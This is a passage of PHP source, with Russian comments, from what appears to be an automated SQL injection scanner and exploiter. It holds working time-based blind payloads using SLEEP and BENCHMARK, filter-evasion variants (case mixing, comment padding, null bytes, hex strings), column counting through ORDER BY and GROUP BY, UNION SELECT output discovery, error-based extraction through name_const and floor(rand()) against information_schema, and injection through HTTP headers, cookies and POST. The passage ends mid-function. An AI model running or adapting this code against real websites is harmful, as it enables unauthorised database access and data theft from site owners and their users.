				}else if($this->ret['sleep']['tp']==2)//' AND SLEEP(3) AND '1
				{
					$this->set['sleep']['flt']['sq']=true; //ковычка в начале
					$this->set['sleep']['flt']['sl']=true; //Можно ли использовать SLEEP

					//Определяем наличие фильтрации двойного комментария
					$this->tmp=$this->send_packet($this->create_packet('',$this->create_get($this->ret['sleep']['key'],$this->ret['sleep']['val']."'/**/AND/**/SlEEp(".$this->sec.")/**/AND/**/'1")),'header','time');
					//если выполнился, значит не фильтруется
					if($this->tmp>=($this->sec-1))$this->set['sleep']['flt']['ed']=false;
					else $this->set['sleep']['flt']['ed']=true;//если нет, то всё обрезаем и не выполняется запрос.

					if($this->set['sleep']['flt']['ed'])$this->set['sleep']['flt']['tp']=true;
				//------------------------------------------------------------//
				}elseif($this->ret['sleep']['tp']==3)//'&&SLEEP(3)&&'1(И sleep и 1)
				{
					$this->set['sleep']['flt']['sq']=true;//кавычка в начале
					$this->set['sleep']['flt']['sl']=true;//5 версия mysql
					
					//определяем фильтрацию пробела, при отсутсвии фильтрации кавычки
					$this->tmp=$this->send_packet($this->create_packet('',$this->create_get($this->ret['sleep']['key'],$this->ret['sleep']['val']."'&&SLeeP('0 ".$this->sec."')&&'1")),'header','time');
					//заведо не верный запрос. Если выполнился, значит пробел фильтруется
					if($this->tmp>=($this->sec-1))$this->set['sleep']['flt']['sp']=true;
					else{
						$this->tmp=$this->send_packet($this->create_packet('',$this->create_get($this->ret['sleep']['key'],$this->ret['sleep']['val']."'&&' '=0x20&&sLEEp(".$this->sec.")&&'1")),'header','time');
						//если не фильтруется, то всё ок, запрос выполнится
						if($this->tmp>=($this->sec-1))$this->set['sleep']['flt']['sp']=false;
						else $this->set['sleep']['flt']['sp']=true;
					}

					//Если не фильтруется пробел то значит фильтруется слово AND
					if(!$this->set['sleep']['flt']['sp'])$this->set['sleep']['flt']['an']=true;
					else{
						$this->tmp=$this->send_packet($this->create_packet('',$this->create_get($this->ret['sleep']['key'],$this->ret['sleep']['val']."'And'1'&&SLEep(".$this->sec.")&&'1")),'header','time');
						if($this->tmp>=($this->sec-1))$this->set['sleep']['flt']['an']=false;
						else $this->set['sleep']['flt']['an']=true;
					}

					//Определяем наличие фильтрации двойного комментария
					$this->tmp=$this->send_packet($this->create_packet('',$this->create_get($this->ret['sleep']['key'],$this->ret['sleep']['val']."'&&'/**/'=0x2F2A2A2F&&SleeP(".$this->sec.")&&'1")),'header','time');
					if($this->tmp>=($this->sec-1))$this->set['sleep']['flt']['ed']=false;
					else $this->set['sleep']['flt']['ed']=true;

					if($this->set['sleep']['flt']['ed']||$this->set['sleep']['flt']['sp']||$this->set['sleep']['flt']['an'])$this->set['sleep']['flt']['tp']=true;
				//------------------------------------------------------------//
				}else if($this->ret['sleep']['tp']==4)//'||SLEEP(3)&&'1
				{ 
					$this->set['sleep']['flt']['sq']=true;
					$this->set['sleep']['flt']['nl']=true;
					$this->set['sleep']['flt']['sl']=true;
					//определяем фильтрацию пробела с первым нул байтом
					$this->tmp=$this->send_packet($this->create_packet('',$this->create_get($this->ret['sleep']['key'],$this->ret['sleep']['val'].chr(0)."'&&sLEeP('0 ".$this->sec."')&&'1")),'header','time');
					if($this->tmp>=($this->sec-1))$this->set['sleep']['flt']['sp']=true;
					else{
						$this->tmp=$this->send_packet($this->create_packet('',$this->create_get($this->ret['sleep']['key'],$this->ret['sleep']['val'].chr(0)."'&&' '=0x20&&sLeEp(".$this->sec.")&&'1")),'header','time');
						if($this->tmp>=($this->sec-1))$this->set['sleep']['flt']['sp']=false;
						else $this->set['sleep']['flt']['sp']=true;
					}

					//Если не фильтруется пробел то значит фильтруется слово AND
					$this->tmp=$this->send_packet($this->create_packet('',$this->create_get($this->ret['sleep']['key'],$this->ret['sleep']['val'].chr(0)."'AND'1'='1'&&sLeeP(".$this->sec.")&&'1")),'header','time');
					if($this->tmp>=($this->sec-1))$this->set['sleep']['flt']['an']=false;
					else $this->set['sleep']['flt']['an']=true;

					//Определяем наличие фильтрации двойного комментария
					$this->tmp=$this->send_packet($this->create_packet('',$this->create_get($this->ret['sleep']['key'],$this->ret['sleep']['val'].chr(0)."'&&'/**/'=0x2F2A2A2F&&sleeP(".$this->sec.")&&'1")),'header','time');
					if($this->tmp>=($this->sec-1))$this->set['sleep']['flt']['ed']=false;
					else $this->set['sleep']['flt']['ed']=true;

					if($this->set['sleep']['flt']['ed']||$this->set['sleep']['flt']['sp']||$this->set['sleep']['flt']['an'])$this->set['sleep']['flt']['tp']=true;
				//------------------------------------------------------------//
				}else if($this->ret['sleep']['tp']==5)
				{// AND BENCHMARK(2999999,MD5(NOW()))
					$this->set['sleep']['flt']['sq']=false;

					//Определяем наличие фильтрации кывычки
					$this->tmp=$this->send_packet($this->create_packet('',$this->create_get($this->ret['sleep']['key'],$this->ret['sleep']['val']." AnD BEncHMARk(2999999,Md5(NoW('')))")),'header','time');
					
					//успешно, предполагает, что не фильтруется.
					if($this->tmp-$this->scnd>1){
						$this->tmp=$this->send_packet($this->create_packet('',$this->create_get($this->ret['sleep']['key'],$this->ret['sleep']['val']." AND BEnCHM'ARK(2999999,Md5(NoW()))")),'header','time');
						//Охуеть это была 404 строка)
						if($this->tmp-$this->scnd>1)$this->set['sleep']['flt']['qt']=true;
						else $this->set['sleep']['flt']['qt']=false;
					}else $this->set['sleep']['flt']['qt']=true;
					
				

					//Определяем наличие фильтрации двойного комментария
					$this->tmp=$this->send_packet($this->create_packet('',$this->create_get($this->ret['sleep']['key'],$this->ret['sleep']['val'].'/**/ANd/**/bENchMARK(2999999,mD5(NOw()))')),'header','time');
					if($this->tmp-$this->scnd>1)$this->set['sleep']['flt']['ed']=false;
					else $this->set['sleep']['flt']['ed']=true;
					if($this->set['sleep']['flt']['ed']||$this->set['sleep']['flt']['qt'])$this->set['sleep']['flt']['tp']=true;
						
				//------------------------------------------------------------//
				}else if($this->ret['sleep']['tp']==6)
				{//&&BENCHMARK(2999999,MD5(NOW()))
					$this->set['sleep']['flt']['sq']=false;

					//Определяем наличие фильтрации кывычки
					$this->tmp=$this->send_packet($this->create_packet('',$this->create_get($this->ret['sleep']['key'],$this->ret['sleep']['val']."&&BenCHMARK(2999999,mD5(nOW('')))")),'header','time');
					if($this->tmp-$this->scnd>1){
						$this->tmp=$this->send_packet($this->create_packet('',$this->create_get($this->ret['sleep']['key'],$this->ret['sleep']['val']."&&bENCHM'ARK(2999999,Md5(Now()))")),'header','time');
						if($this->tmp-$this->scnd>1)$this->set['sleep']['flt']['qt']=true;
						else $this->set['sleep']['flt']['qt']=false;
					}else $this->set['sleep']['flt']['qt']=true;
					//echo('000');
					
					//Определение фильтрации пробела при отсутствии фильтрации кавычки
					if(!$this->set['sleep']['flt']['qt']){
						$this->tmp=$this->send_packet($this->create_packet('',$this->create_get($this->ret['sleep']['key'],$this->ret['sleep']['val']."&&bENCHMArk(2999 999,mD5(noW()))")),'header','time');
						//если выполнился, значит фильтруется.
						if($this->tmp-$this->scnd>1)$this->set['sleep']['flt']['sp']=true;
						else{
							$this->tmp=$this->send_packet($this->create_packet('',$this->create_get($this->ret['sleep']['key'],$this->ret['sleep']['val']."&&' '=0x20&&BenCHMARK(2999999,Md5(NOw()))")),'header','time');
							if($this->tmp-$this->scnd>1)$this->set['sleep']['flt']['sp']=false;
							else $this->set['sleep']['flt']['sp']=true;
						}
					}else{
						$this->tmp=$this->send_packet($this->create_packet('',$this->create_get($this->ret['sleep']['key'],$this->ret['sleep']['val']."&&BENCHmaRK(2999 999,Md5(NoW()))")),'header','time');
						if($this->tmp-$this->scnd>1)$this->set['sleep']['flt']['sp']=true;
						else $this->set['sleep']['flt']['sp']=true;
					}
					//Если не фильтруется пробел то значит фильтруется слово AND
					if(!$this->set['sleep']['flt']['sp'])$this->set['sleep']['flt']['an']=true;
					else{
						//Определение фильтрации слова AND при наличии фильтрации пробела и отсутствии фильтрации кавычки
						if(!$this->set['sleep']['flt']['qt']){
							$this->tmp=$this->send_packet($this->create_packet('',$this->create_get($this->ret['sleep']['key'],$this->ret['sleep']['val']."&&'AND'=0x414E44&&BENCHMArK(2999999,mD5(nOW()))")),'header','time');
							if($this->tmp-$this->scnd>1)$this->set['sleep']['flt']['an']=false;
							else $this->set['sleep']['flt']['an']=true;
						}else{
							$this->tmp=$this->send_packet($this->create_packet('',$this->create_get($this->ret['sleep']['key'],$this->ret['sleep']['val']."&&(1)AnD@x:=1&&BENcHMARK(2999999,Md5(NOw()))")),'header','time');
							if($this->tmp-$this->scnd>1)$this->set['sleep']['flt']['an']=false;
							else $this->set['sleep']['flt']['an']=true;
						}
					}

					//Определяем наличие фильтрации двойного комментария при отсутствии фильтрации кавычки
					if(!$this->set['sleep']['flt']['qt']){
						$this->tmp=$this->send_packet($this->create_packet('',$this->create_get($this->ret['sleep']['key'],$this->ret['sleep']['val']."&&'/**/'=0x2F2A2A2F&&BEncHMARK(2999 999,MD5(noW()))")),'header','time');
						if($this->tmp-$this->scnd>1)$this->set['sleep']['flt']['ed']=false;
						else $this->set['sleep']['flt']['ed']=true;
					}else{
						$this->tmp=$this->send_packet($this->create_packet('',$this->create_get($this->ret['sleep']['key'],$this->ret['sleep']['val']."/**/&&/**/BENChmARK(2999 999,mD5(NoW()))")),'header','time');
						if($this->tmp-$this->scnd>1){
							$this->tmp=$this->send_packet($this->create_packet('',$this->create_get($this->ret['sleep']['key'],$this->ret['sleep']['val']."&&BENChmARk(2999/**/999,Md5(NoW()))")),'header','time');
							if($this->tmp-$this->scnd>1)$this->set['sleep']['flt']['ed']=true;
							else $this->set['sleep']['flt']['ed']=false;
						}else $this->set['sleep']['flt']['ed']=true;
					}
					if($this->set['sleep']['flt']['ed']||$this->set['sleep']['flt']['qt']||$this->set['sleep']['flt']['an']||$this->set['sleep']['flt']['sp'])$this->set['sleep']['flt']['tp']=true;
				//------------------------------------------------------------//
				}else if($this->ret['sleep']['tp']==7)
				{//' AND BENCHMARK(2999999,MD5(NOW())) AND '1
					$this->set['sleep']['flt']['sq']=true;

					//Определяем наличие фильтрации двойного комментария
					$this->tmp=$this->send_packet($this->create_packet('',$this->create_get($this->ret['sleep']['key'],$this->ret['sleep']['val']."'/**/aND/**/BeNCHMARk(2999999,MD5(NoW()))/**/AnD/**/'1")),'header','time');
					if($this->tmp-$this->scnd>1)$this->set['sleep']['flt']['ed']=false;
					else $this->set['sleep']['flt']['ed']=true;

					if($this->set['sleep']['flt']['ed'])$this->set['sleep']['flt']['tp']=true;
				//------------------------------------------------------------//
				}else if($this->ret['sleep']['tp']==8)
				{//'&&BENCHMARK(2999999,MD5(NOW()))&&'1
					$this->set['sleep']['flt']['sq']=true;

					//фильтрация на пробел, без фильтрации на кавычки
					$this->tmp=$this->send_packet($this->create_packet('',$this->create_get($this->ret['sleep']['key'],$this->ret['sleep']['val']."'&&BeNChMARK(29 99999,Md5(nOW()))&&'1")),'header','time');
					if($this->tmp-$this->scnd>1)$this->set['sleep']['flt']['sp']=true;
					else{
						$this->tmp=$this->send_packet($this->create_packet('',$this->create_get($this->ret['sleep']['key'],$this->ret['sleep']['val']."'&&' '=0x20&&BENCHmARK(2999999,mD5(nOW()))&&'1")),'header','time');
						if($this->tmp-$this->scnd>1)$this->set['sleep']['flt']['sp']=false;
						else $this->set['sleep']['flt']['sp']=true;
					}

					//Если не фильтруется пробел то значит фильтруется слово AND
					if(!$this->set['sleep']['flt']['sp'])$this->set['sleep']['flt']['an']=true;
					else{
						$this->tmp=$this->send_packet($this->create_packet('',$this->create_get($this->ret['sleep']['key'],$this->ret['sleep']['val']."'AND'1'&&BENCHmArK(2999999,Md5(nOW()))&&'1")),'header','time');
						if($this->tmp-$this->scnd>1)$this->set['sleep']['flt']['an']=false;
						else $this->set['sleep']['flt']['an']=true;
					}

					//Определяем наличие фильтрации двойного комментария
					$this->tmp=$this->send_packet($this->create_packet('',$this->create_get($this->ret['sleep']['key'],$this->ret['sleep']['val']."'&&'/**/'=0x2F2A2A2F&&bEnCHMARK(2999999,Md5(nOW()))&&'1")),'header','time');
					if($this->tmp-$this->scnd>1)$this->set['sleep']['flt']['ed']=false;
					else $this->set['sleep']['flt']['ed']=true;

					if($this->set['sleep']['flt']['ed']||$this->set['sleep']['flt']['sp']||$this->set['sleep']['flt']['an'])$this->set['sleep']['flt']['tp']=true;
				}
			}
			
			
			if(!empty($this->ret['sleep']['key']))
				{
					//++++++++++++++++++++++++++++++++++++//
					
					//определяем закрывающий символ и крайний комментарий
					$us['scb']='';
					
					$this->tmp=$this->send_packet($this->create_packet('',$this->create_get($this->ret['sleep']['key'],$this->clear_sql('AnD SLeeP('.$this->sec.')'.$us['scb'].' #'))),'header','time');
					

					if($this->tmp>=($this->sec-1))
					{
						$this->set['sleep']['coment']=' #';
						$this->set['sleep']['scb']='';
					}else
					{
						$us['scb']='';
						for($i=0;$i<3;$i++)
						{
							for($i2=0;$i2<4;$i2++)
							{
								if($i2==0)$us['coment']=' ';
								elseif($i2==1)$us['coment']=' -- ';
								elseif($i2==2)$us['coment']=' #';
								elseif($i2==3)$us['coment']=' /*';

								$this->tmp=$this->send_packet($this->create_packet('',$this->create_get($this->ret['sleep']['key'],$this->clear_sql('And sLEEp('.$this->sec.')'.$us['scb'].$us['coment']))),'header','time');

					
								if($this->tmp>=($this->sec-1))
								{
									$this->set['sleep']['coment']= $us['coment'];
									$this->set['sleep']['scb']   = $us['scb'];
									break;
								}
							}
							$us['scb'].=')';
						}
					}
					
					$this->comment = $this->set['sleep']['coment'];
					$this->scb  =$this->set['sleep']['scb'];
					//++++++++++++++++++++++++++++
					
					
					if((!$this->set['sleep']['flt']['sp'])||(!$this->set['sleep']['flt']['ed']))
						{
							$og = 'oRDeR';
							//Количество колонок в таблице через order
							$this->tmp = $this->send_packet($this->create_packet('',$this->create_get($this->ret['sleep']['key'],$this->clear_sql('AND SLEEP('.$this->sec.')'.$this->set['sleep']['scb'].' '.$og.' BY 1'.$this->set['sleep']['coment']))),'header','time');
							
							if($this->tmp>=($this->sec-1))
							{
								//$this->logg('<b>Подбираем количество столбцов:</b>');

							}else
							{
								//$this->logg('<b>Пробуем через group by</b>',2);
								
								$og = 'GrOup';
								//Количество колонок в таблице через group by
								$this->tmp = $this->send_packet($this->create_packet('',$this->create_get($this->ret['sleep']['key'],$this->clear_sql('AND SLEEP('.$this->sec.')'.$this->set['sleep']['scb'].' '.$og.' BY 1'.$this->set['sleep']['coment']))),'header','time');

								if($this->tmp<($this->sec-1))
								{
									//$this->logg('<b>Косяк в запросах GROUP И ORDER</b>',2);
									$this->set['sleep']['columns'] = 0;
									
										
								}	
							}
							
							$this->set['sleep']['og'] = $og;
							$min=1;
							$max=20;
										
							//минимальным количеством запросом ищем количество колонок
							for($i=0;$i<5;$i++)
							{
								$this->tmp=$this->send_packet($this->create_packet('',$this->create_get($this->ret['sleep']['key'],$this->clear_sql('AND SLEEP('.$this->sec.')'.$this->set['sleep']['scb'].' '.$og.' BY '.$max.$this->set['sleep']['coment']))),'header','time');
								
								if($this->tmp>=($this->sec-1))
								{
									if($i==4)
									{
										//$this->logg('<b>Не могу подобрать количество полей, либо их больше '.$max.'</b>',2);
										$this->set['sleep']['columns'] = 0;
										
									}
									
									$max=$max*2;
								}else break;
							}
					
								
							while(1)
							{
								if(($max-$min)<4)break;
								$sred=round(($min+$max)/2);
								$this->tmp=$this->send_packet($this->create_packet('',$this->create_get($this->ret['sleep']['key'],$this->clear_sql('AND SLEEP('.$this->sec.')'.$this->set['sleep']['scb'].' '.$og.' BY '.$sred.$this->set['sleep']['coment']))),'header','time');
								if($this->tmp>=($this->sec-1))
								{
									$min=$sred;
								}else{
									$max=$sred-1;
								}
							}

							$sred=$min;
							for($i=0;$i<5;$i++)
							{
								$this->tmp=$this->send_packet($this->create_packet('',$this->create_get($this->ret['sleep']['key'],$this->clear_sql('AND SLEEP('.$this->sec.')'.$this->set['sleep']['scb'].' '.$og.' BY '.$sred.$this->set['sleep']['coment']))),'header','time');
								if($this->tmp<($this->sec-1))
								{
									$sred=$sred-1;
									break;
								}
								if(($sred-$max)>1)
								{
									//$this->logg('Не могу подобрать количество полей',2);
									$this->set['sleep']['columns'] = 0;
								}
								$sred=$sred+1;
								$this->set['sleep']['columns'] = $sred;
								
							}
							
							$this->set['sleep']['columns']=$sred;
							//$this->logg('Количество столбцов: '.$sred,3);
							unset($min,$max,$sred);//чтобы не мешалось
							
							
							//если количество колонок смогли подобрать)
							if($this->set['sleep']['columns'] != 0)
							{
								$this->column = $this->set['sleep']['columns'];
								//++++++++++++++++++++++++++++++++++//
								$this->tmp = '';
								
								//делает строки из столбцов
								for($i=1;$i<=$this->set['sleep']['columns'];$i++){
									$this->tmp.='0x'.bin2hex('dfet'.$i.'fert').',';
								}
								
								//убираем последний символ
								$this->tmp=substr($this->tmp,0,strlen($this->tmp)-1);
								$hexcolomns = $this->tmp;//запоминаем ниже пригодится
								
								//формирует sql union 0x123,0x1234 ...
								$this->tmp=$this->send_packet($this->create_packet('',$this->create_get($this->ret['sleep']['key'],$this->clear_sql('AND 1=2'.$this->set['sleep']['scb'].' UniON SEleCT '.$this->tmp.$this->set['sleep']['coment']))),'all');
								
								//Ищим вывод, чтобы определить колонку с какой работаем
								//Вариант 1.
								if(preg_match('/dfet([0-9]+)fert/',$this->tmp,$mth))
								{
									//$this->logg('В данном случае присутствует прямой вывод. Поле №'.$mth[1],3);
									$this->set['sleep']['out'] = 1;
									$this->set['sleep']['outp'] = $mth[1];
									
									
									
								}else
								{
									$this->tmp=$this->create_sql('0x20','','-1');
									$this->tmp=$this->send_packet($this->create_packet('',$this->create_get($this->ret['sleep']['key'],$this->clear_sql('And SLeep('.$this->sec.')'.$this->set['sleep']['scb'].' UniON SEleCT '.$this->tmp.$this->set['sleep']['coment']))),'header','time');
									
									if($this->tmp>=($this->sec-1))
									{
										//$this->logg('<b>Прямой вывод отсутствует: Вариант 1</b>',2);
										$this->set['sleep']['out'] = 0;		
									}else
									{
										$unisel = 'Uni/**/ON SEl/**/eCT';
										$this->tmp=$this->create_sql('0x20','','-1');
										$this->tmp=$this->send_packet($this->create_packet('',$this->create_get($this->ret['sleep']['key'],$this->clear_sql('And SLeep('.$this->sec.')'.$this->set['sleep']['scb'].' '.$unisel.' '.$this->tmp.$this->set['sleep']['coment']))),'header','time');
									
										if($this->tmp>=($this->sec-1))
										{
											//формируем sql union 0x123,0x1234 с /**/ ...
											$this->tmp=$this->send_packet($this->create_packet('',$this->create_get($this->ret['sleep']['key'],$this->clear_sql('AND 1=2'.$this->set['sleep']['scb'].' '.$unisel.' '.$hexcolomns.$this->set['sleep']['coment']))),'all');
											
											//Вариант 2.
											if(preg_match('/dfet([0-9]+)fert/',$this->tmp,$mth))
											{
												$this->set['sleep']['outp'] = $mth[1];
												//$this->logg('<b>В нашем случае фильтруется SELECT или UNION: Вариант 2 - Поле №'.$mth[1].'</b>');
												$this->set['sleep']['out'] = 1;
											}else
											{
												//$this->logg('Переходим к EB, не помог вариант с  '.$unisel);
												$this->set['sleep']['out'] = 0;
											}
										}else
										{
											//Пробуем еще такой вариант /*!union*/
											$unisel = '/*!UniON/ /*!SEleCT/';
											$this->tmp=$this->create_sql('0x20','','-1');
											$this->tmp=$this->send_packet($this->create_packet('',$this->create_get($this->ret['sleep']['key'],$this->clear_sql('And SLeep('.$this->sec.')'.$this->set['sleep']['scb'].' '.$unisel.' '.$this->tmp.$this->set['sleep']['coment']))),'header','time');
											
											if($this->tmp>=($this->sec-1))
											{
												$this->tmp=$this->send_packet($this->create_packet('',$this->create_get($this->ret['sleep']['key'],$this->clear_sql('AND 1=2'.$this->set['sleep']['scb'].' '.$unisel.' '.$hexcolomns.$this->set['sleep']['coment']))),'all');	
												
												//Вариант 3.
												if(preg_match('/dfet([0-9]+)fert/',$this->tmp,$mth))
												{
													$this->set['sleep']['outp'] = $mth[1];
													//$this->logg('<b>В нашем случае фильтруется SELECT или UNION: Вариант 3 - Поле №'.$mth[1].'</b>');
													$this->set['sleep']['out'] = 1;
												}else
												{
													//$this->logg('Переходим к EB, не помог вариант с '.$unisel);
													$this->set['sleep']['out'] = 0;
													
												}	
											}else
											{
												$this->set['sleep']['out'] = 0;	
											}
										}		
									}
								}
								
								
								//если прямой вывод присутствует
								if($this->set['sleep']['out'] != 0)
								{
									$this->sposob = 10;
									$this->method = 10;
									$this->work[] = $this->set['sleep']['outp'];
								
								
								}else
								{
									//$this->logg('out = 0 ');
									return false;
								
								}//не смогли найти вывод прямой
							
							}else{
									//$this->logg('columns = 0 ');
									return false;
								
								}//не смогли найти колонки
							
						}else{
							//$this->logg('filtrs silnye ');
							return false;
						
						}

					
				}
			
			endif;//sleep_check2
			return true;
			
			
		
		}

}

	function mysqlFindErrorSqlNEW(){//name_const mysql 5 и выше; sposob до 2 $this->method = 6
		
	
		$this->keyword = 'ololosher';

		//var $konec_for_chek = array('+1=1','%27+%27x%27=%27x','%22+%22x%22=%22x');
		//+or+(1,2)=(select*from(select%20name_const(CHAR(111,108,111,108,111,115,104,101,114),1),name_const(CHAR(111,108,111,108,111,115,104,101,114),1))a)
		
		
		$string['']  = "+or+(1,2)=(select*from(select%20name_const(CHAR(111,108,111,108,111,115,104,101,114),1),name_const(CHAR(111,108,111,108,111,115,104,101,114),1))a)+--+and+1%3D1";
		$string['%27']  = "%27+or+(1,2)=(select*from(select%20name_const(CHAR(111,108,111,108,111,115,104,101,114),1),name_const(CHAR(111,108,111,108,111,115,104,101,114),1))a)+--+%27x%27=%27x";
		$string['%22']  = "%22+or+(1,2)=(select*from(select%20name_const(CHAR(111,108,111,108,111,115,104,101,114),1),name_const(CHAR(111,108,111,108,111,115,104,101,114),1))a)+--+%22x%22=%22x";

		$sp=0;
		
		foreach ($string as $key=> $val)
		{
			
			$str1 = $this->getContents($this->url.$val);
			
			//$this->d($this->url.$val,'$this->url.$val');
			//$this->d($str1,'$str1');
		
		
			if(strstr($str1, $this->keyword)){
				
				$this->get_by_error = $key;
				$this->method = 6;
				$this->sposob = $sp;	
				return true;
				
				break;
		
			}
			$sp++;
		}


		return false;
		
	}
	
	function mysqlOrderError(){//floor как у моего скрипта в первой версии $this->method = 5;
	
		$string['']  = "999999.1+and(select+1+from(select+count(*),concat((select+(select+(SELECT+distinct+concat(0x7e,0x27,%27ololo%27,0x27,0x7e)+FROM+information_schema.schemata+LIMIT+1))+from+information_schema.tables+limit+0,1),floor(rand(0)*2))x+from+information_schema.tables+group+by+x)a)+and+1=1+";
		$string['%27']  = "99999%27+and(select+1+from(select+count(*),concat((select+(select+(SELECT+distinct+concat(0x7e,0x27,%27ololo%27,0x27,0x7e)+FROM+information_schema.schemata+LIMIT+1))+from+information_schema.tables+limit+0,1),floor(rand(0)*2))x+from+information_schema.tables+group+by+x)a)+and+--+%27x%27=%27x";
		$string['%22']  = "99999%22+and(select+1+from(select+count(*),concat((select+(select+(SELECT+distinct+concat(0x7e,0x27,%27ololo%27,0x27,0x7e)+FROM+information_schema.schemata+LIMIT+1))+from+information_schema.tables+limit+0,1),floor(rand(0)*2))x+from+information_schema.tables+group+by+x)a)+and+--+%22x%22=%22x";

		
		$sp = 0;
		
		foreach ($string as $key=> $val)
		{
			
			$str1 = $this->getContents($this->url.$val);
			
			//$this->d($str1,'$str1');
			//exit;
		
			if(strstr($str1, 'ololo')){
				
				$this->get_by_error = $key;
				$this->sposob = $sp;
				$this->method = 5;
				return TRUE;
		
			}
			$sp++;
		}
		
		return false;
	}
	
	function mysqlFindErrorSql(){//floor другой $this->method = 4
		
		$this->d('mysqlFindErrorSql start ');
		$this->keyword = 'The used SELECT statements have a different number of columns';

		$string['']  = "999999.1+union+select+unhex(hex(version()))+--+and+1%3D1";
		$string['%27']  = "99999%27+union+select+unhex(hex(version()))+--+%27x%27=%27x";
		$string['%22']  = "99999%22+union+select+unhex(hex(version()))+--+%22x%22=%22x";

		$sp = 0;
		foreach ($string as $key=> $val)
		{
			
			$str1 = $this->getContents($this->url.$val);
			
			//$this->d($this->url.$val,'$this->url.$val');
			//$this->d($str1,'$str1');
		
			if(strstr($str1, $this->keyword))
			{

				$this->get_by_error = $key;
				$this->sposob = $sp;
				break;
		
			}
			$sp++;
		}

		
		if($this->get_by_error==FALSE AND $this->get_by_error!=='')return false;
		
		$last = "99.1".$this->get_by_error."+or+(select+count(*)+from+(select+1+union+select+2+union+select+3)x+group+by+concat(CHAR(".$this->charcher('FACKER')."),floor(rand(0)*2)))+--+".$this->get_by_error."x=".$this->get_by_error."x";
		
		//$this->d($this->url.$last,'$this->url.$last');
		
		$test = $this->getContents($this->url.$last);
		
		//$this->d($test,'$test');
		
		
		if(strstr($test, 'FACKER'))
		{

			$this->method = 4;	
			return true;
			
		}

		return false;
		
	}
	
	
	
	////////////////////////////////////////////////////////////////
	//////////////////////Общие функции на всякий///////////////////
	////////////////////////////////////////////////////////////////
	
	function inj_test_get_head_all($url,$hs = array()){//нельзя для POST ИСПОЛЬЗОВАТЬ !!!! 
		
		
		$all = array('referer','useragent','forwarder','cookies');
		if($hs['url'] !='')$url = $hs['url'];
		
		
		//$url = $this->filter_url($url);
		//$tmp = parse_url($url);
		//$url =$tmp['path']; 
		
		
		
		foreach($all as $inj)
		{
			
			$hs['inject']=$inj;
			
			$test = $this->inj_test_get_head($url,$hs);
		
			if($test!==false)
			{
				return $inj;
			}
			
		}
		
		return false;
	}
	
	function inject_all($url2){//проверка всех строк в urls полностью
		
		
		//$url2 = $this->filter_url($url2);//сомнительная очистка
		$urls = $this->urlParseUrl($url2);
		
		
		foreach ($urls as $url_chek)
		{
			$this->d($url_chek,'PROVERKA URL inject_all');
			$this->url = $url_chek;
			$test = $this->inject($url_chek);
			//exit; 	
			if($test!==false)
			{
				return 'inject';
			}
		}	
	}	
	
	function head_inject_all($url,$hs = array()){ //нельзя для POST ИСПОЛЬЗОВАТЬ !!!! 
		
		
		$all = array('referer','useragent','forwarder','cookies');
		if($hs['url'] !='')$url = $hs['url'];
		
		
		foreach($all as $inj)
		{
			
			$hs['inject']=$inj;
			
			$test = $this->head_inject($url,$hs);
		
			if($test!==false)
			{
				return 'inject head - '.$inj;
			}
			
		}
	}

	function sqli_all($url=''){//используется в inj_test
		
		
		if($url !=''){
			$this->url=$url;
		}else{
			$this->url = $this->url;
		}
		
		//$url2 = $this->filter_url($url2);//сомнительная очистка
		$urls = $this->urlParseUrl($url);
		
		
		foreach ($urls as $url_chek)
		{
			$this->d($url_chek,'url_chek PROVERKA URL sqli_all');
			$this->url = $url_chek;
			$test = $this->sqli($url_chek);
			
			if($test!==false)
			{
				return 'sleep_metod';
			}
		}	
		
	}

	////////////////////////////////////////////////////////////////
	//////////////////////СЛУЖЕБНЫЕ ФУНКЦИИ/////////////////////////
	////////////////////////////////////////////////////////////////
	public function check_head($url){
		if(stristr($url,'post::'))
			{
                
                
                if($this->proxy_no_check){
            
                }else{
                
                    $this->d('RABOTA S POST');
                }
				
				$url = str_replace('post::','',$url);
				$tmp = explode("?",$url);
				
				$this->h_s['cookies']='';
				$this->h_s['post']=$tmp[1];
				$this->h_s['inject']='post';
				$this->h_s['url']=$tmp[0];
				return true;
			}
	}
	
	public function check_https($url='',$hs=array()){
	
	if($this->https_check==false)
	{
		
		if($url !='')
		{
			if(stristr($url,'https'))
			{
				$this->d('RABOTA S HTTPS');
				$this->https=true;
			}
		}
		
		//if($hs['https']==true ){$this->https=true;}else{$this->https=false;} 
		
		$this->https_check=true;
		
	}
	
}	

	public function filter_url($url){
		
		$url = str_replace('get::','',$url);
		//$url = str_replace('post::','',$url);
		
	
		$url = str_replace('http://http://','http://',$url);
		$url = str_replace('https://https://','https://',$url);
		
	
		$url = str_replace('WWW.','www.',$url);
		$url = str_replace('wwwwww.','www.',$url);
		$url = str_replace('wwwwww','www',$url);
		
			
			
		$url = str_replace("http://http://","",$url);
		$url = str_replace("https://http://","",$url);
		$url = str_replace("https://https://","",$url);
		$url = str_replace(array("http://","https://"),"",$url);	
		
		$url = str_replace('//','/',$url);
		$url =  trim($url);
		
		//$this->d($url,'url filter_url');
		return $url;
		
	}
		
	public function get_to_post($url){
		
		
		$r = explode('?',$url);
		
		$data['url']     = 	$r[0];
		$data['post']     = $r[1];
		return $data;
	}

	public function filter_str($url){ //функция для очистки строки при выводе (юзера версии)
		$url = str_replace("'","",$url);
		$url = str_replace("\"","",$url);
		//$url = str_replace("https://https://","",$url);
		//$url = str_replace(array("http://","https://"),"",$url);
		return $url;
		
	}
	
	public function getContents($url,$time=20){//функция для подготовки потока
		
		
		
		
		
		if(is_file('stop.txt'))
		{
			
			@unlink('stop.txt');
			@unlink('process.txt');
			
			$fh = fopen('process.txt', "a+");
			fwrite($fh, time().'|NO'."\n");
			fclose($fh);
			
			die('stopped');
		}
		
		
		
		//$this->d($url,'$url');
		$this->url_old = $url;
		
		if($this->url_encode==true){
			$url = str_replace(array('+',' '), '%20',$url);
			
		}else{
			$url = str_replace('+', ' ',$url);
		}
		
		
		$this->urls[] = $url;
		
		if(isset($this->timeaut))$time=$this->timeaut;
	
			
		if($this->method_old ==false)
		{	
			$contents = $this->get_web_page($url);
		}
		

		if($contents=='' or $this->method_old==true)
		{
			
			
			$this->url_old = str_replace('-- +', 'goodfff',$this->url_old);
			$this->url_old = str_replace('++', '+',$this->url_old);
			$this->url_old = str_replace('+', ' ',$this->url_old);
			$this->url_old = str_replace('goodfff', '-- +',$this->url_old);
			
			
			$contents = $this->get_web_page($this->url_old);
			
			if($this->debug==true){$this->d($contents,'$contents getcontents');}
			
			if($contents !=''){$this->method_old=true;}
		}
			


	return $contents;
	
}
	
	public function get_web_page($url,$proxy = FALSE,$ct = 1 ){
            
		  	
		
		if($this->head_enable==true AND $this->h_s['head'] != 'GET'){
			
